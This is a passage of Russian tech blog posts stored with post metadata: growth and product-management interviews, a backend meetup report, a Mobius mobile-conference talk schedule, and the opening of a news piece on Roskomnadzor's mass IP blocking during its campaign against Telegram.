макеты, закидываешь в чатик макет с вопросом: «Что ты видишь на этом макете? Что ты можешь сделать на этом макете?» и конкретные вопросы про функциональность. А еще попросить оценить по десятибалльной шкале, насколько это решает его потребность.\n\r\nТакже полезно собирать фидбек в процессе продаж. Sales-менеджеры после каждой сессии продаж должны тезисно записывать, почему клиент купил или почему не купил. Этими тезисами важно делиться в общих чатах. Пусть они автоматически прилетают в Slack продакту, дизайнеру, тим лиду, разработчику, руководителю. Поговорили с людьми, сделайте скрипт, чтобы одним кликом можно было отправить все инсайды после интервью на внутренний email. Таким образом, фидбек будет циркулировать постоянно.\n\nКак дружить дизайнера и продакта?\n\r\nОднажды я посмотрел лекцию, которая очень сильно поменяла мое отношение к работе с дизайнерами. Суть в следующем: огромное количество ценности заложено в работе другого человека. Здесь главное убрать свое эго, понять точку зрения другого человека, и задать ему максимум вопросов, чтобы определить, почему он так сформулировал задачу, почему такой макет прислал и так далее. У вас нет задачи переубедить другого человека, ваша задача — вырастить метрику. Обязательно должны генерировать идеи вместе, формулировать задачи в терминах Job Story. Дизайнер обязательно должен знать, как минимум, про что продакт-менеджер поговорил с людьми, тогда каждое микрорешение он будет принимать чуть лучше.\n\nС чего начинается день продакта?\n\r\nЯ всегда начинаю со stand up, потому что stand up – это классная тема, чтобы загрузить контекст предыдущего дня команды и скорректировать контекст будущего. Также у продакта обязательно должно быть большое количество времени на подумать. Часто ловил себя в таком состоянии, когда весь день во встречах или в слотах на «поработать», и нет даже получаса, чтобы посидеть подумать: «Окей, а что у нас с метрикой?».\n\nКакую книгу посоветуешь прочитать?\n\r\nОбязательно все книги Intercom’a. Intercom – просто бешеные черти, они себя круто фокусируют и транслируют во внешний мир. Книги «Jobs to Be Done», «on Product Management», «on Starting Up». Обязательно «StartUp», «Lean UX», «Pirate Metrics», «Inspired», «Спроси маму» — это базис. Еще мне очень понравилась книга «Тонкое искусство пофигизма», в оригинале «The Subtle Art of Not Giving a Fuck». Для того, чтобы достичь успеха, ты неизбежно должен сделать огромное количество ошибок. Хочешь – не хочешь, просто надо сделать большое количество ошибок, а дальше выбирай такую сферу и такие ошибки, чтобы тебе было от них не очень больно, а в идеале, чтобы получал удовольствие.\n\nПриложения в твоем телефоне?\n\r\nПочтовый клиент Spark, Notion, Airtable, банк Рокет и Сбер, Точка, Telegram, безумно люблю Clear — лучшая Todo за счет того, что есть возможность закрепить на 15% экрана. Это самое крутое, что случалось в моей производительности по приложениям.\n\nКрутой пример UX-интерфейса?\n\r\nAirtable — космическая штука, снимаю перед ребятами шляпу, они решили сложную задачу с множеством уровней абстракций. Это база данных, которую ты можешь очень вариативно показать: в календаре, табличкой. Еще скрипты можно добавить. Много функций и все они доступны и легко воспринимаются пользователем.\n\nПочему инфобизнес, а не продукт?\r\nЯ вижу огромную точку роста в работе не по найму. Да, некомфортно, когда знаешь, что нет гарантированного заработка, и завтра можешь ничего не заработать. Это ставит в такие условия, в которых растешь кратно быстрее.\n\r\nЕсть рост, когда ты выбираешь более интересный проект, в этом проекте борешься за более интересную ответственность, добиваешься процентного роста метрик — тебя повышают и ты растешь на проценты или десятки процентов.\n\r\nА есть рост, когда ты рискуешь — с высокой вероятностью проваливаешься, с какой-то вероятностью растешь. И фишка этого роста в том, что ты делаешь кратно большее количество ошибок, как в книге «Тонкое искусство пофигизма», и обучаешься кратно быстрее. Ставки выше и результат тоже кратно выше.\n\r\nИван участвовал в проекте Epic Growth Story — флешмоб от Gett и Epic Growth Conference, где специалисты по продуктам и маркетингу делятся эпичными историями роста и гроусхаками. Подборка лучших историй: egconf.ru/growthstory и в Телеграм канале t.me/epicgrowth.", {"day": "10", "month": "мая", "time": "11:31"}, {"rate": 11, "views": 2300}], ["18 апреля у нас в офисе прошел первый митап, посвященный кросс-языковым решениям для разработки серверной части. «Винегрет», судя по нашим впечатлениям и отзывам гостей митапа, удался. Значит, будем продолжать практику объединения бэкендеров, чаще встречаться и обсуждать общие подходы и инструменты для разных языков. Ну а пока публикуем видео, слайды, отзывы и фото. Всё это — под катом. \n\nBuilding observable applications. Михаил Кабищев (Gett RnD)\nМихаил рассказал нам о базовых техниках и подходах, которые сделают спокойнее сон по ночам после запуска приложения на продакшене. От ошибок и падений они не спасут, но помогут их идентифицировать и быстро среагировать. Речь в докладе идёт о логировании, метриках и распределенной трассировке.\n\nПрезентация\nОтзывы:\n\nОтличный доклад! Очень интересно и по делу.\nХороший доклад, узнал много новых интересных тулов.\nОчень интересный и хорошо структурированный доклад. Полезный разбор подходов к логированию и трасированию сервисной архитектуры.\n\n\nОдин кликстрим на все бэкенды. Внедрение инструментария для отправки аналитических событий в php, go, python. Дмитрий Хасанов (Авито)\nДмитрий рассказал, как прокачивать миллиарды событий и не лишиться рассудка. Как нам в Авито удается применять общие правила сбора и отправки аналитических событий на разных платформах, среди которых — бэкенды проектов на php, go, python. И почему бэкенды — хорошо, а фронтенды сложнее. \n\nПрезентация\nОтзывы:\n\nУ автора хорошее повествование, материал воспринимается легко, продолжайте в том же духе.\nПолезный опыт внедрения лангпаков, как решения проблемы с неконсистентным форматом данных. Хорошие замечания на тему версионирования.\n\n\nЭтот страшный кросс-платформенный мир. Александр Емелин (Авито, Centrifugo)\nАлександр сделал доклад про свою работу над опенсорс-решением для отправки сообщений пользователям в реальном времени Centrifugo. Про техники, которые позволили реализовать отдельностоящий сервер, интегрирующийся с бэкендом, написанном на любом языке программирования, про современные транспорты доставки сообщений в браузеры и мобильные клиенты. Про проблемы поддержки такого кросс-платформенного решения. О попытке выделить ядро сервера в отдельную библиотеку для языка Go. Про реализацию протокола второй версии сервера, который может работать как с JSON, так и с Protobuf. И о некоторых важных оптимизациях при работе с большим количеством постоянных соединений.\n \nПрезентация \nОтзывы:\n\nАвтор подошел к докладу с юмором, что немного взбодрило уже уставших к вечеру слушателей, все супер.\nОх, просто спасибо. Пусть докладчик не во всём выглядел уверенно, но за работу ему огромный респект. За вынесение функционала в отдельную библиотеку респект отдельный. Ждём полноценного релиза centrifuge.\n\n\n\nСпасибо всем, кто пришёл на митап, посмотрел видеозаписи. Фотоотчёт со встречи мы выложили на на Facebook и Вконтакте. Чтобы раньше всех узнавать о мероприятиях для технических специалистов в Avito, подписывайтесь на наш Timepad. Будем рады, если вы расскажете, на какие темы вам бы хотелось послушать доклады на Backend United #2.", {"day": "4", "month": "мая", "time": "10:28"}, {"rate": 9, "views": 3100}], ["Epic Growth Story — флешмоб от Gett и Epic Growth Conference, где специалисты по продуктам, маркетингу и дизайну делятся эпичными историями роста. В формате блиц-интервью Денис Пушкин Head of Product Marketing в Skyeng поделился, как устроен продуктовый маркетинг и growth-hacking в одной из самых быстрорастущих компаний России.\n\n\r\nСмотрите интервью и читайте расшифровку под катом.\n\nКоманда роста в Skyeng?\n\r\nВесь Skyeng – это команда роста. У нас есть верхнеуровневый план компании, который из года в год не меняется, – вырасти в 3 раза. Каждый человек в Skyeng занимается тем, чтобы компания выросла в 3 раза. Для этого он развивает себя, развивает свои продукты, увеличивает метрики в зависимости от своего направления. Я увеличиваю количество заявок первых оплат. Ребята из операционного отдела занимаются ростом retention, интенсивностью занятий, и каждый по чуть-чуть вкладывая, делает только то, что приводит Skyeng к росту. \n\nПродуктовый маркетинг в Skyeng – это?\n\r\nПродуктовый маркетинг в Skyeng – это про деньги, как и маркетинг в целом. Наш фокус – это привлечение новых платящих клиентов. Это наша основная метрика и вся работа направлена на то, чтобы принести Skyeng больше денег. У меня есть личный KPI – через 5 лет заработать миллиард для Skyeng. Эта супер амбициозная цель. Для достижения этой цели выстраиваются все процессы на продуктовом маркетинге. Мы занимаемся оптимизацией воронок, ускоряем проведение экспериментов, строим Big Data и Machine Learning модели, предсказания. Добавляем ума в наши продукты и ценообразование.\n\nMindset продакта?\n\r\nЕсли говорить о том, что ты потратил на команду 10 миллионов за год, а заработал 60 миллионов за год, то ни у кого не возникает вопросов классный ты или не классный. Конечно, ты классный! Ты делаешь X6 на тех ресурсах, которые у тебя есть. Это расширяет твою сферу ответственности, дает новые возможности. И если у продакта будет денежный Mindset, то мне кажется, он сможет многого достичь. \n\r\nКогда я слышу, что люди говорят, что невозможно посчитать что-то в деньгах – люди ленятся. Все возможно посчитать в деньгах. Внутренний продукт или биллинг можно посчитать в деньгах. Знания, которые ты даешь людям, тоже можно посчитать в деньгах. Да, это очень сложно. Не бывает точного подсчета. Но посчитать и оценить собственный вклад в деньгах всегда можно. \n\nКак устроен growth-hacking в Skyeng? \n\r\nУ нас есть планомерный процесс тестирования гипотез по воронке, он состоит сначала из customer development, потом UX-тестирования, математического моделирование и только потом AB-теста, как самого дорогого элемента проверки гипотезы. Но до AB-теста доходят только те гипотезы, которые дают 5%, 10%, 15% выручки. Основной хак – проверять только самое ценное. То есть то, что дает максимальную выгоду, а все остальное оставлять на других этапах. \n\r\nИз последнего, что мы делали – это эксперименты с ценообразованием. По результатам сложных AB-тестов, историй успеха и провала, мы потенциально увеличим выручку на 5%. Для нашего объема бизнеса – это очень высокий процент и рост.\n\nЧто должен делать продакт в первый месяц своей работы?\n\r\nВ первый месяц своей работы продакт должен влезть везде, где только может: во все процессы, в любую коммуникацию. Прямая задача продакта – это осознать, что происходит, и наладить процесс. Для этого необходимо пообщаться со всеми заказчиками, со стейкхолдерами компании, даже с теми, кто непосредственно не связан с твоей работой. Важно понять, что сейчас происходит в компании, куда компания идет, и как продакт своими действиями может помочь компании достичь ее цели. А может быть и даже перевыполнить ее цель. \n\nКакого человека примешь на работу? \n\r\nВ любой компании, а в Skyeng особенно, пропагандируется подход найма людей, которые в первую очередь разделяют культуру компании, у которых есть культурный код Skyeng. Это люди самостоятельные, они могут двигаться сами. Ты даешь человеку старт и возможность, а он дальше либо реализует ее, либо нет. Это люди проактивные, они не сидят и не ждут, когда им скажут, что делать, они хотят достигать всего сами. Skyeng дает неограниченные возможности для роста, и человек должен либо воспользоваться ими, либо не работать в Skyeng. \n\r\nСотрудник Skyeng внутренне свободен и открыт ко всему новому. На нашем уровне развития и при нашем размере – очень мало практик, которые дают большой рост. Нужно постоянно что-то придумывать, нужны инновации. И человек должен быть открыт к этим инновациям, даже если он 10 лет до этого делал что-то одним методом. Возможно, в Skyeng этот метод уже не сработает. Нужно научиться у лучших на рынке, прочитать лучшие гроусхаки и методы увеличения выручки, retention, монетизации, чего угодно, – применить их и получить крутой результат. \n\nКак работать с информацией?\n\r\nПодход, который я пропагандирую: первое – это фокус, то есть изучать только ту информацию, которая нужна для решения конкретных задач. Нет смысла читать книгу про customer development, если ты этим не занимаешься. Это трата времени. Второе – скорость потребление информации. Необходимо потратить много времени, чтобы прочитать даже одну книгу. Книги должны быть приоритезированы в бэклог по важности в соответствии с целями. Недавно я открыл для себя приложение Smart Reading. Это подход, когда ты можешь быстро (за 30 мин) прослушать или прочитать саммари из книги, и понять, хочется в нее углубиться или нет. Smart Reading – это не метод получения точной информации, это метод, как и в продуктовой работе – поиска гипотез и книг, которые дают максимальную пользу. \n\nЛюбимое приложение? \n\r\nЛюбое приложение – это инструмент. Из инструментов, которыми я постоянно пользуюсь и которые ощутимо улучшили эффективность моей работы, – это Inbox от Google. Это продукт, который за счет автоматизация Machine Learning смог в разы сократить мое время взаимодействия с почтой. Я на почту трачу максимум полчаса в неделю для того, чтобы выкинуть все ненужное и оставить только самое важное. Это очень большой буст в моей продуктивности. Пользу, которую дал мне Inbox, максимальна, это супер классный продукт, который мне очень нравится. \n\nПриложение – боль? \n\r\nК сожалению, мне приходится регулярно пользоваться WhatsApp, но я бы поменял там все. WhatsApp это продукт, который дает мне больше страданий, чем пользы. Я вынужден им пользоваться, потому что им пользуются другие люди. Но если выбирать, то я бы предпочел, например, Telegram. В Telegram огромное количество функций для меня как для пользователя B2C клиента; и для меня как для компании, которая может предоставлять услуги своим B2B клиентам. В WhatsApp я ничего не могу, я даже не могу залогиниться в браузере без того, чтобы телефон был в онлайне. А мне кажется в 2018 году просто стыдно иметь такой технологической компании, как Facebook – такой технологически отсталый продукт, как WhatsApp. \n\n3 вещи, которыми хочешь научиться?\n\r\nПервое – это фокус. Я, к сожалению, не могу похвастаться тем, что хорошо концентрируюсь и фокусируюсь на каких-то отдельных задачах. Я люблю на многое распыляться. Это моя большая точка роста. Еще два качества, которых мне сейчас не хватает, но которые основные для продакт-менеджера. Они связаны с подбором очень крутой и сильной команды. Функция продакта – это построить команду, которая будет достигать высоких результатов. И мне пока сейчас не хватает компетенции в найме максимально сильных и топовых людей, которые могут давать лучший результат в единицу времени.\n\r\nВторое – увольнять слабых сотрудников, которые не соответствуют скорости Skyeng и тянут команду назад. Это самый трудный навык, потому что его сложно практиковать. Любой навык тренируется практикой. А навык увольнения практиковать сложно.\n\nЧто должно быть в чек-листе у продакт-менеджера? \n\r\nВ чек-листе любого продакта должен быть ответ на один вопрос: нужно это делать или нет, есть в этом польза или нет пользы? Если да, то все остальное продакт придумает.\n\r\nДелитесь своими историями на Facebook с хештэгом #epicgrowthstory. Лучшие авторы получат призы от Gett и попадут в подборку лучших историй.", {"day": "26", "month": "апреля", "time": "11:32"}, {"rate": 11, "views": 2200}], ["Epic Growth Story — флешмоб от Gett и Epic Growth Conference, где специалисты по продуктам, маркетингу и дизайну делятся эпичными историями роста. В формате блиц-интервью Олег Хаустов Head of Performance Marketing (Delivery Club) делится гроусхаками и трендами монетизации в продуктах. \n\n\r\nСмотрите интервью и читайте расшифровку под катом.\n\n3 продукта – синонима growth-hacking?\r\nМеня очень сильно радует то, что делает Skyeng в России, то, что делает Едадил и Тинькофф – это настоящие гроус хакеры. Для меня это три продукта, три бизнеса, которые в некотором смысле перевернули представление о том, как должен трансформироваться продукт, чтобы показывать настоящий Growth Hack.\n\nGrowth-story продукта?\r\nСамый большой игрок в мире уборок – это сервис Handy. Крупнейший сервис уборок в мире, который, по-моему, в 10 раз больше, чем Qlean. Один из самых масштабных хаков, который поменял бизнес и который во многом будет следующим шагом для Qlean и для похожих сервисов, – хак, когда продукт полностью отказывается от оффлайн операций. Когда проект отказывается от офиса, от живых интервью, и полностью переходит на онлайн-воронку. \n\r\nКлассический пример в России – это Dostavista – сервис, который отказался от оффлайн набора, перешел на онлайн, и за счет этого показал кратный рост. Все проекты, которые переходят на онлайн-воронки в части supply, стартуют и масштабируются резко в 10, 20, 30 раз.\n\nQuick Wins в продукте?\r\nВ случае с Qlean сильный рост показал happy week days. Это распродажа слотов на уборки внутри недели, которые не выгодны основной части населения, и на которые мы можем сделать небольшой дисконт и отдать дешевле. Что мы сделали? Мы посмотрели распределение наших заказов; поняли, в какие из дней сильное проседание, и сместили наоборот. Быстро сделали дизайн страницы и повесили первые слоты.\n\r\nТаким образом, мы загрузили клинеров, позволили клиентам за меньшие деньги получить тот продукт, который они хотят попробовать. Сделали это за неделю. Первая версия была сырой. Пользователь оставлял телефон в форме заявки, заявка падала в колл-центр, и колл-центр вручную назначал уборку. Не было никакой автоматизации. За один день в будние дни этот хак увеличил загруз по заказам на 30%. Дальше мы начали масштабировать, и за пару месяцев сделали из этого полноценный продукт. Пользователям понравилось. Люди оказались готовы к тому, чтобы отказываться от удобного для себя времени для того, чтобы немного сэкономить. Это был настоящий прорыв.\n\r\nВ случае с Delivery гроус хаки лежат больше в плоскости маркетинга. У нас есть подборки различных ресторанов по той или иной тематике. В какой-то момент мы поняли, что подборка – это не только контентная история, когда мы можем рассказать, где позавтракать и так далее. Мы стали использовать подборки для целей маркетинга, устраивать различные конкурсы. Это тоже показало мощнейший результат. Ты слегка меняешь Call To Action, и для пользователя это становится не просто контентной историей, а маркетинговым инструментом.\n\nКакого продукта на рынке вам не хватает?\r\nОтвечу, как маркетолог. Очень не хватает полноценной автоматизированной платформы для работы с блогерами. Тот, кто сделает полноценный инструмент, превратит процесс в оцифрованную экономику – озолотится и поменяет рынок.\n\nТренд в монетизации продукта?\r\nЗдесь необходимо разделять продукты, которые живут в сфере контента, то есть в первую очередь поставляют пользователям контент, и продукты, которые живут как транзакционный бизнес. Если говорить про контент, то здесь логичен тренд в переход к транзакции. Если у вас, например, информационное приложение «Театр», которое информирует о последних новинках в мире театра. Логично, что у пользователя в приложении появляется возможность сделать заказ, предзаказ или другой призыв к действию.\n\r\nДля приложений, которые работают с контентом, тренд монетизации – это переход к транзакциям. А как раз в вопросе тех сервисов, которые уже работают на транзакции – это обращение к контенту. \n\nКак работать с командой?\r\nЧто произойдет, если не говорить людям, что делать? Каждый новый день ты начинаешь видеть, как фантастическим образом люди начинают кооперироваться, ставить себе задачи, идти в продукт и говорить: «Нам этого не хватает». Когда это начинает происходить, дальше руководитель только направляет людей. \n\r\nМы сейчас проверили одну интересную фичу – KPI для команды, которую команда сама себе поставила. Я сказал: «Напишите план, как вы видите, как мы должны расти дальше». Ребята написали, мы обсудили это one by one, потом обсудили все вместе и пришли к выводу, что такой формат гораздо удобнее: люди понимают и формируют свою ответственность. И как только сотрудник напрямую формирует свою ответственность, здесь происходит синергия – человек начинает чувствовать себя частью бизнеса.\n\nКак будет выглядеть профессия продакта через пять 5 лет?\r\nПрофессия ближайших 5 лет – это маркетинговый продакт, который делает умные штуки, интеграции с теми рекламными сервисами, которые есть сейчас. Таргетологи, менеджеры по контекстной рекламе будут уходить или трансформироваться в маркетинговых продактов.\n\nЛучшие сервисы для работы?\r\nТо, что меня сильно привлекло и чем я достаточно активно сейчас пользуюсь – сервис «Notion». Я начинаю замечать, что все больше и больше продакт менеджеров и маркетологов начинают пользоваться этим сервисом. Notion – полноценная платформа, соединяющая в себе возможность создания, хранения контента. Это Dropbox Paper в сочетании с Trello и Jira. Внутри проекта очень много удобных возможностей.\n\r\nЕще один отличный аналитический сервис для работы – Open Source BI от Airbnb. \n\r\nДелитесь своими историями на Facebook с хештэгом #epicgrowthstory. Лучшие авторы получат призы от Gett и попадут в подборку лучших историй.", {"day": "23", "month": "апреля", "time": "11:06"}, {"rate": 19, "views": 2300}], ["20-21 апреля, то есть уже завтра-послезавтра, в Петербурге пройдёт конференция по мобильной разработке Mobius. Android и iOS, разнообразные темы от многопоточности до тестирования, российские спикеры и зарубежные звёзды — о том, что там будет, мы уже писали. \n\r\nА вот о чём ещё не сообщали: в оба дня конференции онлайн-трансляция первого зала будет бесплатной. Идти будет на YouTube, так что смотреть удобно где угодно — хоть на смартфоне, хоть на телевизоре. И хотя ничто не может заменить полностью личное присутствие, мы стараемся приблизить онлайн-опыт к нему. Например, зрители трансляции могут писать в специальный чат свои вопросы спикерам, а между докладами будут видеть интервью со спикерами и включения со спонсорских стендов. В общем, в оба дня запускайте трансляцию на самом удобном для вас экране и наслаждайтесь!\n\r\nА какие именно доклады попали в доступную для всех трансляцию? Под катом — все их названия и описания.\n\nДень первый (20 апреля)\n \n10:30 Trusting iOS SDKs\nИспользование сторонних SDK существенно ускоряет процесс разработки, но в то же время таит в себе и подводные камни. Феликс поговорит о том, какие риски вызывает зависимость от стороннего кода, и как потенциальный злоумышленник может с лёгкостью добавить зловредный код в ваше приложение. \n\n Felix Krause / Google\n\nФеликс — создатель fastlane, опенсорсного инструмента для автоматизации задач, связанных с iOS- и Android-разработкой. С 2015-го он в Twitter, а около года назад вместе с fastlane перешёл в Google. Недавно он анонсировал CI-систему для мобильных разработчиков fastlane.ci, и мы тогда взяли у него интервью.\n\n\n12:00 Профайлинг в примерах: ищем бутылочное горлышко\nСкорее всего, ваше приложение отлично себя чувствует на последнем Пикселе. Наверняка и на первом. Но как понять, достаточно ли хорошо оно работает на других устройствах? Что делать после обнаружения проблемы и как не допустить её повторения?\nДоклад представляет из себя технический кейс. Мы не будем углубляться в дебри оптимизаций, но рассмотрим, с чего стоит начать.\nЕсть приложение, которое работает. Есть ощущение, что оно работает недостаточно быстро. Сначала мы разберёмся, насколько правдиво это ощущение, с помощью более точных инструментов, нежели интуиция. Затем «препарируем» это приложение, используя несколько инструментов один за другим, попутно внося оптимизации. Время ограничено, поэтому мы сосредоточимся на части инструментов: профилировщик GPU, Hierarchy Viewer, отображение Overdraw. Напоследок рассмотрим несколько инструментов, позволяющих следить за тем, насколько хорошо приложение работает от сборки к сборке.\nРазумеется, серебряной пули не существует, как и универсального решения всех проблем. Однако для того, чтобы решить проблему, нужно её найти и локализовать. Понимание того, «где мы находимся сейчас» — неотъемлемая часть успешного движения вперёд. \n\n Артур Бадретдинов / Vyng\n\nСчитает, что каждый программный инженер — разработчик, но не каждый разработчик — программный инженер. Пишет код так, чтобы потом за него не было стыдно. Работает над тем, чтобы программа не просто делала своё дело, но и её логика была понятна и расширяема другими людьми. В последнее время делает рингтоны под Android уникальными в компании Vyng.\n\n13:30 Мультиплатформенная архитектура на Kotlin для iOS и Android\nKotlin семимильными шагами двигается в сторону кроссплатформенности, появляются десятки репозиториев с приложениями различной сложности.\nМы расскажем как уже сейчас начать скрещивать Clean Architecture с Kotlin Multiplatform Projects, как писать бизнес-логику приложения один раз для всех платформ и какие ограничения наложит такой подход.\nДоклад будет интересен адептам Kotlin, которые не боятся приставок Experimental и бойлерплейта чистого архитектурного подхода. \n\n\n Роман Яцына / Revolut\n\nAndroid-разработчик в Revolut.\r\nПриверженец Clean Architecture, давний фанат Kotlin.\r\nВ свободное время пишет об Android-разработке на Medium и Хабрахабр.\n\n Иван Важнов / Revolut\n\nAndroid-разработчик в Revolut.\r\nДо мобильной разработки долго занимался базами данных и enterprise-проектами, также увлекается разработкой под iOS и смежными сферами.\r\nЛюбит чистый и красивый код.\n\n\n15:15 Рождение, жизнь и смерть, или Что происходит с приложением в системе\nAndroid – очень сложная система, где происходит много разных вещей, которые очень хорошо скрыты от обычных разработчиков.\r\nВ докладе разберем:\r\n— как Android запускает себя, запускает приложения;\r\n— кто, зачем, через какие механизмы и какие методы вызывает в стартуемых компонентах приложений;\r\n— куда уходят запросы на получение прав доступа к тем или иным ресурсам, на основании чего система решает, выдать права или нет;\r\n— как в итоге умирает приложение: за что может быть убито, что произойдёт, если самоубьётся.\nЗнания, полученные из доклада, помогут Android-разработчикам более тонко чувствовать систему, для которой они пишут, и учитывать некоторые нюансы, что сделает их приложения более предсказуемыми. \n\n\n Антон Дудаков / Яндекс\n\nАнтон работает в Лаборатории встраиваемых автомобильных решений компании Яндекс. Занимает позицию тимлида проекта Яндекс.Авто, благодаря которому Яндекс встраивается в автомобили.\n\n\n16:15 Сервисы: нельзя без них, а как с ними жить?\nПоговорим о том, как в Android меняются ограничения на фоновую работу и как это влияет на разработчиков. Доклад не сводится к набору инструкций «примените Y к X». Слушателю нужно будет задуматься, сформулировать вопросы и залезть в кроличью нору :) \n\n Йонатан Левин  / KolGene\n\nЙонатан — один из ведущих израильских мобильных разработчиков, часть элитной команды Google Developer Experts. Сыграл ключевую роль в успехе Gett, собравшем более 500 миллионов долларов, а также получил финансирование своего стартапа KolGene, набирающего популярность генетического market connector-а. Будучи верным приверженцем мобильного и продукт-менеджмента, Йонатан также с большим энтузиазмом занимается бэкендом. Как состоявшийся разработчик и предприниматель, он точно знает, как превратить умные идеи в прибыльный продукт.\n\n\n17:35 На плечах гигантов: языки, у которых учился Kotlin\nРасскажем о тех языках, из которых мы заимствовали идеи и концепции, когда разрабатывали Kotlin. В числе прочего, речь пойдет о Java, C#, Scala, Groovy, Python, Gosu и т.д. Покажем, как некоторые из этих идей изменились в нашей интерпретации. И немного расскажем о том, какие известные языки теперь учатся на нашем опыте (Swift, Java, Hack, C#). \n\n Андрей Бреслав / JetBrains\n\nАндрей Бреслав возглавляет разработку языка Kotlin в компании JetBrains c 2010 года, занимается как дизайном языка, так и общим руководством проекта. Ключевой спикер крупных конференций. Один из авторов блога Kotlin.\n\n\n\nДень второй (21 апреля)\n \n10:30 Многомодульная архитектура проекта\nНа разных этапах зрелости проекта работают разные подходы к организации кода: архитектура эволюционирует вместе с компанией. Пока в серверной разработке в тренде микросервисы, в мобильных приложениях набирает обороты модуляризация.\nЗа последние пару лет в Avito собралась достаточно крупная, по меркам мобильных приложений, команда – около 25 разработчиков под каждую из платформ. Для удобства работы мы шагнули в модуляризацию проекта.\nНа примере Avito iOS и Android расскажем:\n\nо наших подходах к модуляризации проектов ~ 400k LOC;\nоб изменениях времени сборки в зависимости от стадии модуляризации;\nо способах измерения прогресса модуляризации проектов;\nоб экспериментах со здоровьем aka Application Health Check.\n \n\n Евгений Суворов / Avito\n\nПрофессионально начал разрабатывать для мобильных приложений осенью 2010 года. Прошел через многие виды компаний: стартапы заказной разработки, стартапы продуктовые, большие холдинги. С 2014 года работает в Avito, руководит командой, сфокусированной на мобильной архитектуре iOS и Android. С 2016 года член Программного комитета AppsConf, с 2017 — член ПК Mobius.\n\n\n12:00 Как не состариться во время сборки: Kapt и другие приключения\nЭто история из жизни проекта, который стал, как и многие сейчас, слишком долго собираться и иметь слишком сильную связанность ввиду своей монолитности. История со своими взлетами и падениями времени сборки. Это итог рефакторинга длиною в год, а также исследований, которыми в основном занимаются только в продуктах масштаба Uber и Facebook. Время, проведенное в настройках Gradle, конфигурации Dagger2 и продумывание хитрых решений для уменьшения связанности заняли не один человеко-месяц. А вывод и решение чудесным образом как раз умещаются в час доклада. \n\n Денис Неклюдов / 90seconds.tv, Android GDE\n\nGoogle Developer Expert, живущий бок о бок с Android более шести лет. Несколько раз проводил курсы Studyjams по обучению Android, спикер многих конференций, в том числе Dump, Droidcon, Mobius. Также известен как один из ведущих подкаста о разработке под Android. Сейчас работает в Сингапуре в 90Seconds.tv.\n\n\n13:30 Data-driven UI: безграничная власть\nРасскажем про технику построения и тестирования data-driven UI-компонентов. Такой подход обеспечивает максимальную изоляцию отдельных модулей, возможность писать snapshot-тесты, unit-тесты, а также интерактивные тесты (storybook).\nНа примерах покажем, как создавать анимации, переходы между экранами и интерактивные жесты с применением data-driven методик. Примеры будут ориентированы на платформу iOS и язык Swift, но методика вполне подходит и для Android. \n\n Алексей Демедецкий / Sigma Software\n\nМобильный разработчик в компании Sigma Software. Семь лет своей жизни занимается созданием мобильных продуктов на заказ. Свою миссию видит в поиске максимально эффективного подхода к конвертации бизнес-гипотез в поддерживаемый код. Для этого часто исследует новые архитектуры, изучает встраиваемые языки, метапрограммирование. Основной метрикой оптимизации для себя видит стоимость внесения изменений и все свои решения строит вокруг ее минимизации.\n\n\n15:15 What mom never told you about multithreading\nКогда мы были детьми, были табуированные темы, о которых наши мамы никогда не заговаривали. Высока вероятность, что они никогда не говорили о многопоточности.\n\r\nПоэтому в этом докладе Фернандо и аудитория вместе пройдутся по тому, какие различные варианты для работы с многопоточностью существуют сегодня на мобильных платформах. В первую очередь речь пойдёт от Android, но многое сказанное будет применимо и к другим платформам. \n\n Fernando Cejas / IBM\n\nФернандо Сехас занимается Android-разработкой с момента появления платформы. На один из прошлых Mobius он приезжал как сотрудник Soundcloud, но недавно Фернандо стал developer advocate в IBM — отчасти как раз по той причине, что новая работа позволяет ему чаще ездить на конференции и делиться знаниями.\n\n\n16:45 Релизы мобильных приложений в Avito\nВ докладе расскажем о том, как устроен процесс релизов мобильных приложений в Avito, как можно собрать в одном месте десятки фичей, над которыми работают сотни людей и ничего не сломать. Покажем, какие шаги в процессе можно автоматизировать, как сократить объём ручного тестирования перед релизом и, тем не менее, быть уверенными, что ничего не сломалось. \n\n Алексей Шпирко  / Avito\n\niOS-разработчик с 2011 года, техлид кроссфункциональной команды, занимающейся ускорением релизов мобильных приложений в Avito. Ранее три года был тимлидом команды iOS-разработчиков в Avito, а до этого — Senior iOS-разработчиком в Samsung.\n\n\n18:15 The epic battle: iOS vs. Android\r\nНе существует «плохих операционных систем». Существуют разработчики, создающие приложения для пользователей. То, каково пользователям жить с ОС, зависит от их знаний.\n\r\nКакое сообщество лучше разбирается в своей области? Android-разработчики, которым нужно иметь дело с безумной фрагментацией, или iOS-мастера, сталкивающиеся со строгими гайдлайнами от Apple? \n\r\nВпервые в истории у вас будет возможность доказать, на какой платформе лучше разработчики. Как? Всё будет в завершающем кейноуте конференции.\n\n\n Йонатан Левин  / KolGene\n\nЙонатан — один из ведущих израильских мобильных разработчиков, часть элитной команды Google Developer Experts. Сыграл ключевую роль в успехе Gett, собравшем более 500 миллионов долларов, а также получил финансирование своего стартапа KolGene, набирающего популярность генетического market connector-а. Будучи верным приверженцем мобильного и продукт-менеджмента, Йонатан также с большим энтузиазмом занимается бэкендом. Как состоявшийся разработчик и предприниматель, он точно знает, как превратить умные идеи в прибыльный продукт.\n\nНапоминаем ссылку на открытую трансляцию. А если одного зала вам оказалось мало, и хочется иметь доступ к происходящему во всех залах (а сразу после окончания конференции получить видеозаписи всех докладов) — на сайте всё ещё можно приобрести доступ к платной трансляции.", {"day": "19", "month": "апреля", "time": "17:32"}, {"rate": 24, "views": 3200}], ["UPD. В вечерней выгрузке появилась подсеть 51.136.0.0/15 (Microsoft Limited UK): это 131 тыс. IP-адресов Microsoft, в том числе дата-центров Azure\n19 апреля пошёл четвёртый день блокады, которую Роскомнадзор устроил российским пользователям. Количество заблокированных IP-адресов по состоянию на 11:54 достигло 17 766 060, приблизившись к пиковым значения второго дня веерных блокировок.\n\r\nОсновная тактика Роскомнадзора по-прежнему заключается в массовом блокировании подсетей облачных провайдеров, чтобы заставить их отказаться от сотрудничества с Telegram: «Они сейчас решают, будут ли работать на территории РФ или нет», — сказал глава Роскомнадзора Александр Жаров. Услугами этих провайдеров пользуются тысячи российских добропорядочных сайтов, один за другим испытывают проблемы при доступе из России, хотя Роскомнадзор пытается отрицать эти факты.\n\r\nДве недели назад такой сценарий Роскомнадзора сработал в случае с Zello, но сейчас тактика даёт сбой. Ни Google, ни Amazon пока не идут на попятную. \n\nСлон в посудной лавке\r\nВчера в выгрузку реестра добавлены подсети популярного лоукостера DigitalOcean, которым пользуются немало разработчиков, в том числе для поднятия свооих собственных VPN. Вечером 18 апреля Роскомнадзор поручил закрыть доступ к подсетям 